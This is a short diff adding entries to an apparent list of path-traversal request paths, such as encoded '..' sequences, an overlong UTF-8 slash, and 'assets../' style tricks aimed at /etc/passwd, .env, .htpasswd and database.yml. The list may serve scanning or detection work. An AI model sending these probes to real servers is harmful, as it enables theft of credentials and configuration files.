@@ -1,5 +1,7 @@
+/%2e%2e%5c/%2e%2e%5c/etc/passwd
 /%2f_next%2fstatic%2fchunks%2fapp%2f%5B%2e%2e%2enot-found%5D%2fpage-63e952e68a371605%2ejs
 /%2fpms
+/..%e0%80%af../etc/passwd
 /....//....//.env
 //pms
 /_next../.htaccess
@@ -23,6 +25,7 @@
 /assets../.htaccess
 /assets../config/database.yml
 /assets../config/settings.py
+/assets../etc/passwd
 /assets../settings.py
 /build../.htpasswd
 /build../config/database.yml
@@ -52,6 +55,7 @@
 /files../.htpasswd
 /files../config/database.yml
 /files../config/settings.py
+/files../etc/passwd
 /files../settings.py
 /fonts../.htaccess
 /fonts../.htpasswd
@@ -96,6 +100,7 @@
 /static../.htpasswd
 /static../config/database.yml
 /static../config/settings.py
+/static../etc/passwd
 /static../manage.py
 /static../var/www/html/%2eenv
 /static../var/www/html/.env
